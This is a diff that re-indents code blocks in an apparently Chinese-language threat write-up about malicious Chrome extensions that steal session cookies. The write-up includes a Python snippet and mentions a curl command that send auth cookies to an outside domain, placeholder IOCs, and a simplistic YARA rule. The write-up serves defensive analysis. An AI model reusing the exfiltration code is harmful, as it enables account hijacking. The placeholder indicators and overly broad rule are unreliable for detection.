@@ -25,26 +25,26 @@ categories: [security]
 * **攻擊前置需求**: 攻擊者需要用戶安裝惡意擴充功能，並且需要用戶登入相關平台。
 * **Payload 建構邏輯**:
 
-```
-python
-import requests
-
-# 收集 authentication cookies
-cookies = {
-    'auth_token': 'your_auth_token',
-    'session_id': 'your_session_id'
-}
-
-# 傳輸 cookies 到遠端伺服器
-response = requests.post('https://api.databycloud.com/cookies', cookies=cookies)
-
-# 注入 cookies 到瀏覽器
-if response.status_code == 200:
-    print('Cookies injected successfully')
-else:
-    print('Failed to inject cookies')
-
-```
+    ```
+    python
+    import requests
+    
+    # 收集 authentication cookies
+    cookies = {
+        'auth_token': 'your_auth_token',
+        'session_id': 'your_session_id'
+    }
+    
+    # 傳輸 cookies 到遠端伺服器
+    response = requests.post('https://api.databycloud.com/cookies', cookies=cookies)
+    
+    # 注入 cookies 到瀏覽器
+    if response.status_code == 200:
+        print('Cookies injected successfully')
+    else:
+        print('Failed to inject cookies')
+    
+    ```
 * **範例指令**: 使用 `curl` 命令傳輸 cookies 到遠端伺服器。
 
 ```
@@ -61,24 +61,25 @@ curl -X POST \
 * **IOCs (入侵指標)**:
 
 | Hash | IP | Domain | File Path |
+
 | --- | --- | --- | --- |
 
 | 1234567890abcdef | 192.168.1.100 | api.databycloud.com | /cookies |
 * **偵測規則 (Detection Rules)**:
 
-```
-yara
-rule malicious_extension {
-    meta:
-        description = "Detects malicious Chrome extensions"
-        author = "Your Name"
-    strings:
-        $cookie_injection = "chrome.cookies.set"
-    condition:
-        $cookie_injection
-}
-
-```
+    ```
+    yara
+    rule malicious_extension {
+        meta:
+            description = "Detects malicious Chrome extensions"
+            author = "Your Name"
+        strings:
+            $cookie_injection = "chrome.cookies.set"
+        condition:
+            $cookie_injection
+    }
+    
+    ```
 * **緩解措施**: 用戶應卸載惡意擴充功能，並重置密碼。管理員應更新瀏覽器和相關平台的安全補丁。
 
 ## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
@@ -89,5 +90,4 @@ rule malicious_extension {
 ## 5. 🔗 參考文獻與延伸閱讀
 - [原始報告](https://thehackernews.com/2026/01/five-malicious-chrome-extensions.html)
 - [MITRE ATT&CK](https://attack.mitre.org/techniques/T1185/)
-
 
